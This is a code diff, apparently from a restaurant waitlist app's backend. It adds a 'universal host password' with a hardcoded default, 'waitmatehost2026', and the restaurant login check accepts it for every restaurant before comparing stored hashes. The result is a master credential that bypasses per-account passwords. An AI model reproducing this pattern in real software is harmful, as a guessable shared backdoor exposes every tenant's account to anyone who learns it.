@@ -21,6 +21,21 @@ function founderPassword() {
   return process.env.FOUNDER_PASSWORD || "waitmatefounder2026";
 }
 
+function universalHostPassword() {
+  return process.env.UNIVERSAL_HOST_PASSWORD || "waitmatehost2026";
+}
+
+function getActiveUniversalHostHash() {
+  if (global._universalHostPwdHash) return global._universalHostPwdHash;
+  return hashPassword(universalHostPassword());
+}
+
+function isUniversalHostPassword(password) {
+  const provided = String(password || "").trim();
+  if (!provided) return false;
+  return hashPassword(provided) === getActiveUniversalHostHash();
+}
+
 function getActiveFounderHash() {
   if (global._founderPwdHash) return global._founderPwdHash;
   return hashPassword(founderPassword());
@@ -67,6 +82,7 @@ function sanitizeRestaurant(restaurant) {
 function verifyRestaurantPassword(restaurant, password) {
   const provided = String(password || "").trim();
   if (!provided) return false;
+  if (isUniversalHostPassword(provided)) return true;
   const lower = provided.toLowerCase();
   if (restaurant.password_hash) {
     if (hashPassword(provided) === restaurant.password_hash || hashPassword(lower) === restaurant.password_hash) {
